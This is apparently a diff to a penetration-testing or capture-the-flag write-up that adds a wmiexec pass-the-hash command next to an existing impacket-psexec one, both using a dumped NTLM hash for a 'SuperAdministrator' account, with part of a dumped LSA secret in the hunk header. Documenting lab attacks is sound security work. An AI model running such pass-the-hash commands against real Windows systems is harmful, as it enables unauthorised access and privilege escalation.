@@ -113,3 +113,9 @@ NL$KM:f029c01ef8c0266c730380bc4d8603b643b70893c5f98bc7051d665afc16411585b38eab1b
 ```shell
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c SuperAdministrator@IP powershell.exe
 ```
+
+> In my case, I used the target windows 10 instead to escalate my privs using wmiexec.
+
+```
+wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c SuperAdministrator@127.0.0.1
+```
